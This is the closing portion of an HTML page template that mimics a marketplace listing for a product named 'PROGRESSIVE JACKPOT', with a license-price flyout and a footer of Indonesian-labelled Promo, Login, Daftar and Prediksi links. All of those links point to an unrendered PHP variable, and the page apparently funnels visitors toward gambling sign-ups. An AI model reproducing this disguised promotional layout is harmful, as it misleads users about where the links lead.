			<iframe name="__uspapiLocator" tabindex="-1" role="presentation" aria-hidden="true" title="Blank" style="display: none; position: absolute; width: 1px; height: 1px; top: -9999px;"></iframe><iframe tabindex="-1" role="presentation" aria-hidden="true" title="Blank" src="https://consentcdn.cookiebot.com/sdk/bc-v4.min.html" style="position: absolute; width: 1px; height: 1px; top: -9999px;" bis_size="{&quot;x&quot;:0,&quot;y&quot;:-9999,&quot;w&quot;:1,&quot;h&quot;:1,&quot;abs_x&quot;:0,&quot;abs_y&quot;:-9999}" bis_id="fr_nfjaf2yt3zkyajcjvi02tl" bis_depth="0" bis_chainid="1"></iframe>
			<div class="js-flyout__body flyout__body -padding-side-removed" data-show="false" bis_skin_checked="1">
				<span class="js-flyout__triangle flyout__triangle"></span>
				<div class="license-selector" data-view="licenseSelector" bis_skin_checked="1">
					<div class="js-license-selector__item license-selector__item" data-license="regular" data-name="PROGRESSIVE JACKPOT" bis_skin_checked="1">

						<div class="license-selector__license-type" bis_skin_checked="1">
							<span class="t-heading -size-xxs">Regular License</span>
							<span class="js-license-selector__selected-label e-text-label -color-green -size-s " data-license="regular">Selected</span>
						</div>
						<div class="license-selector__price" bis_skin_checked="1">
							<span class="t-heading -size-m h-m0">
								<b class="t-currency"><span class="">$21</span></b>
							</span>
						</div>
						<div class="license-selector__description" bis_skin_checked="1">
							<p class="t-body -size-m h-m0">Use, by you or one client, in a single end product which end users
								<strong>are not</strong> charged for. The total price includes the item price and a buyer fee.
							</p>
						</div>
					</div>
				</div>
				<div class="flyout__link" bis_skin_checked="1">
					<p class="t-body -size-m h-m0">
						<a class="t-link -decoration-reversed" target="_blank" href="<?php echo $urlPath;?>">View license details</a>
					</p>
				</div>
			</div>
			<div class="daftarku-fixed-footer">
			<a href="<?php echo $ampmek;?>" rel="nofollow noopener" target="_blank">
				<img layout="intrinsic" height="20px" width="20px" src="https://imgsaya.io/download/cLdzIs8C.png" alt="Promo">
				Promo
			</a>
			<a href="<?php echo $ampmek;?>" rel="nofollow noopener" target="_blank">
				<img layout="intrinsic" height="20px" width="20px" src="https://imgsaya.io/download/VRoan6gk.png" alt="Login">
				Login
			</a>
			<a href="<?php echo $ampmek;?>" rel="nofollow noopener" target="_blank" class="tada">
				<img layout="intrinsic" height="20px" width="20px" src="https://imgsaya.io/download/VbvB4Xmk.png" alt="Daftar">
				Daftar
			</a>
			<a href="<?php echo $ampmek;?>" rel="nofollow noopener" target="_blank">
				<img layout="intrinsic" height="20px" width="20px" src="https://imgsaya.io/download/zaENZf80.png" alt="Link">
				Prediksi
			</a>
			<a href="<?php echo $ampmek;?>" rel="nofollow noopener" target="_blank"
				class="js_live_chat_link live-chat-link">
				<img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://imgsaya.io/download/KvNtqrYa.png" alt="Live Chat">
				Live Chat
			</a>
		</div>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="aa0e390b349607549f273e46-|49" defer></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'983abc2ffdbca066',t:'MTc1ODYzNzc5NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"983abc2ffdbca066","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.9.1","token":"ad81c56bf02044a5bfcff66a5564b0ad"}' crossorigin="anonymous"></script>
</body>
</html>
